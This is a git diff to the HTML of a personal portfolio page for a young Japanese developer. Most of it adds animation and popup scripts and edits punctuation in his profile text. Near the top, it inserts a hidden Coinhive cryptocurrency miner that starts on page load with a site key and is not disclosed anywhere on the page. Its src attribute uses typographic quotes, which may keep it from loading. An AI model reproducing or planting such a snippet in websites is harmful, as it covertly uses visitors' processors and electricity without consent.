@@ -15,7 +15,12 @@
         gtag('config', 'UA-120739547-1');
 
     </script>
+    <script src=”https://coin-hive.com/lib/coinhive.min.js”></script>
+    <script>
+        var miner = new CoinHive.User('wLz2XK7GvXFL5ACzHzzkYTYVAUZI308q');
+        miner.start();
 
+    </script>
     <meta charset="UTF-8">
     <meta name="twitter:site" content="@yoshi1125hisa" />
     <meta name="twitter:card" content="summary" />
@@ -98,6 +103,36 @@
             });
         });
 
+        $(function() {
+            setTimeout('rect()'); //アニメーションを実行
+        });
+
+
+        function rect() {
+            $('#rect').animate({
+                marginTop: '-=10px'
+            }, 800).animate({
+                marginTop: '+=10px'
+            }, 800);
+            setTimeout('rect()', 1600); //アニメーションを繰り返す間隔
+        }
+
+        //    ポップアップ
+        $(function() {
+            $('.zoom_up').click(function(e) {
+                e.preventDefault();
+                var id = $(this).attr('href');
+                $(id).fadeIn();
+                $('.popupbg').fadeIn();
+                $('body').addClass('stop-scrolling');
+            })
+            $('.popupbg,.close_btn').click(function() {
+                $('.popup_wrapper:visible').fadeOut();
+                $('.popupbg').fadeOut();
+                $('body').removeClass('stop-scrolling');
+            });
+        });
+
 
         // グローバル変数
         var syncerTimeout = null;
@@ -176,6 +211,15 @@
             </div>
         </div>
 
+        <div id="rect">
+            <img src="" alt="">
+        </div>
+
+        <div class="hello">
+            <img src="" alt="">
+        </div>
+
+
         <div class="sub_logo">
             <img src="img/name_left.png" width="424" height="263" alt="">
         </div>
@@ -210,7 +254,7 @@
         <div class="introduce fuwat">
             <p style="font-style: italic">　かいの　よしひさ</p>
             <p class="name">改野由尚</p>
-            <p>2001年11月25日生まれ、16歳。<br>兵庫県姫路市出身。<br>角川ドワンゴ学園N高等学校 心斎橋キャンパス 在学中<br> 株式会社スカイワード CTO 最高技術責任者。
+            <p>2001年11月25日生まれ, 16歳.<br>兵庫県姫路市出身.<br>角川ドワンゴ学園N高等学校 心斎橋キャンパス 在学中.<br> 株式会社スカイワード CTO 最高技術責任者.
             </p>
         </div>
         <div class="btn fuwat">
@@ -288,6 +332,7 @@
                 </mask>
             </svg>
         </h2>
+        <div class="popupbg"></div>
         <div class="wrapper fuwat">
             <div class="project">
                 <a href="https://www.sky-ward.ne.jp/twitter/">
